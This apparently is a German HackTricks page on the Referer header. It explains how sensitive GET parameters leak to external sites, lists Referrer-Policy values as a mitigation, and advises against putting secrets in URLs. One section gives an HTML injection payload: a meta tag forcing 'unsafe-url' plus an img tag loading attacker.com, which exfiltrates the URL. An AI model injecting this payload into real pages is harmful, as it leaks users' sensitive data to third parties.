# Interessante HTTP-Themen

{{#include ../banners/hacktricks-training.md}}

## Referrer-Header und -Policy

Referrer ist der Header, den Browser verwenden, um anzugeben, welche Seite zuvor besucht wurde.

### Leaken sensibler Informationen

Wenn sich zu irgendeinem Zeitpunkt innerhalb einer Webseite sensible Informationen in den Parametern einer GET-Anfrage befinden und die Seite Links zu externen Quellen enthält oder ein Angreifer den Benutzer dazu bringen kann, eine vom Angreifer kontrollierte URL zu besuchen (Social Engineering), könnten die sensiblen Informationen aus der letzten GET-Anfrage exfiltriert werden.

### Mitigation

Du kannst den Browser eine **Referrer-Policy** verwenden lassen, die **verhindern könnte**, dass die sensiblen Informationen an andere Webanwendungen gesendet werden:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Gegenmaßnahme

Du kannst diese Regel mithilfe eines HTML-Meta-Tags außer Kraft setzen (der Angreifer muss eine HTML-Injection ausnutzen):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verteidigung

Platziere niemals sensible Daten in GET-Parametern oder Pfaden in der URL.

{{#include ../banners/hacktricks-training.md}}
